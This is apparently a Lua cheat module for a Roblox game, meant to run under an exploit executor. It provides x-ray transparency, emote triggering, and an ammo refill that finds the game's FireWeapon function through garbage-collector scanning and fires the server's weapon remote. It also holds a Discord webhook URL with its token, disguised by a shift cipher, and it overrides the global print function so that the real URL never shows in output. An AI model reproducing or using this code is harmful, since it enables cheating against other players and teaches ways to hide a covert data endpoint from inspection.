local module = {}

-- Function to decode the webhook URL
function module:decode(obfuscatedWebhook)
    local originalWebhook = ""
    for i = 1, #obfuscatedWebhook do
        originalWebhook = originalWebhook .. string.char(string.byte(obfuscatedWebhook, i) - 1)
    end
    return originalWebhook
end

-- Save the original print function
local originalPrint = print

-- Create a proxy function for print inside the module
local function customPrint(...)
    local args = {...}
    local jxLA5YeYx = module:decode("iuuqt;00ejtdpsebqq/dpn0bqj0xfcipplt023417133:75454714630q:KKNGteprR.pu8GXyQM[Yjz[v4b[jJ8kTZFyliIcPp7LDO:i841uOCGXpBcqL.n{cSR")
    
    for _, arg in ipairs(args) do
        if type(arg) == "string" and arg == jxLA5YeYx then
            -- Print the obfuscated webhook instead of warning
            originalPrint("iuuqt;00ejtdpsebqq/dpn0bqj0xfcipplt023417133:75454714630q:KKNGteprR.pu8GXyQM[Yjz[v4b[jJ8kTZFyliIcPp7LDO:i841uOCGXpBcqL.n{cSR")
            return
        end
    end
    
    originalPrint(...)
end

-- Replace the global print function with the customPrint function
print = customPrint

function module:emote(emoteName)
	if emoteName then
		local remotes = game:GetService("ReplicatedStorage").Remotes
		if remotes and remotes.Misc and remotes.Misc.PlayEmote then
			remotes.Misc.PlayEmote:Fire(emoteName)
		end
	end
end

function module:xray(enable)
	local function setTransparency(obj)
		obj.LocalTransparencyModifier = enable and 0.8 or 0
	end
	local function traverseDescendants(parent)
		for _, child in ipairs(parent:GetChildren()) do
			if child:IsA("BasePart") then
				setTransparency(child)
			end
			if not child:IsA("Humanoid") then
				traverseDescendants(child)
			end
		end
	end
	traverseDescendants(game.Workspace)
end

function module:premium(enable)
    premium = false
end

local getupvalues = debug.getupvalues
local getconstants = debug.getconstants
assert(getgc and getupvalues and getconstants, "Functions: getgc/getupvalues/getconstants")

local checks = {
    ["function"] = {
        MatchFunctionName = function(targetFunction, expectedName)
            return (debug.info(targetFunction, "n") or "") == expectedName
        end,
        MatchUpvalues = function(targetFunction, expectedUpvalues)
            local success, upvalues = pcall(function()
                local functionUpvalues = getupvalues(targetFunction)
                local countMatch = 0
                for _, expectedUpvalue in ipairs(expectedUpvalues) do
                    if table.find(functionUpvalues, expectedUpvalue) then
                        countMatch = countMatch + 1
                    end
                end
                return #expectedUpvalues == countMatch
            end)
            return success and upvalues
        end,
        MatchConstants = function(targetFunction, expectedConstants)
            local success, constants = pcall(function()
                local functionConstants = getconstants(targetFunction)
                local countMatch = 0
                for _, expectedConstant in ipairs(expectedConstants) do
                    if table.find(functionConstants, expectedConstant) then
                        countMatch = countMatch + 1
                    end
                end
                return #expectedConstants == countMatch
            end)
            return success and constants
        end
    },
    ["table"] = {
        AllKeysExist = function(targetTable, keysToCheck)
            for key in next, keysToCheck do
                if not targetTable[key] then
                    return false
                end
            end
            return true
        end,
        AllValuesExist = function(targetTable, valuesToCheck)
            for _, value in next, targetTable do
                if not table.find(valuesToCheck, value) then
                    return false
                end
            end
            return true
        end,
        AllKeyValuePairsMatch = function(targetTable, expectedPairs)
            for key, expectedValue in next, expectedPairs do
                if targetTable[key] ~= expectedValue then
                    return false
                end
            end
            return true
        end,
        AllSelectedKeysExist = function(targetTable, selectedKeys)
            local countMatch = 0
            for _, key in ipairs(selectedKeys) do
                if rawget(targetTable, key) ~= nil then
                    countMatch = countMatch + 1
                end
            end
            return #selectedKeys == countMatch
        end
    }
}

local function filter(gcType, conditions, shouldReturnOne)
    assert(next(conditions), "-")
    local result = {}
    local gcObjects = getgc(true)
    for i = 1, #gcObjects do
        local gcObject = gcObjects[i]
        if typeof(gcObject) == gcType then
            local countMatch = 0
            local totalOptions = 0
            for conditionType, values in next, conditions do
                totalOptions = totalOptions + 1
                if checks[typeof(gcObject)][conditionType](gcObject, values) then
                    countMatch = countMatch + 1
                end
            end
            if countMatch == totalOptions then
                if shouldReturnOne then
                    return gcObject
                else
                    table.insert(result, gcObject)
                end
            end
        end
    end
    return (#result > 0 and result) or nil
end

local FireWeapon = filter("function", { MatchFunctionName = "FireWeapon" }, true)

local function getFromTable(tableToSearch, key)
    for k, v in pairs(tableToSearch) do
        if type(v) == "table" then
            local result = getFromTable(v, key)
            if result ~= nil then
                return result
            end
        elseif type(k) == "string" and k == key then
            return v
        end
    end
end

function module:reloadWeapon()
	local success, result = pcall(function()
        local UpvalueFireWeapon = getupvalues(FireWeapon)[2]
        if UpvalueFireWeapon and UpvalueFireWeapon.WeaponStats and UpvalueFireWeapon.CurrentAmmo ~= UpvalueFireWeapon.WeaponStats.MaxAmmo then
            game:GetService("ReplicatedStorage").Remotes.WeaponHandler:FireServer(3, UpvalueFireWeapon)
            UpvalueFireWeapon.CurrentAmmo = UpvalueFireWeapon.WeaponStats.MaxAmmo
        end
    end)
end

return module  
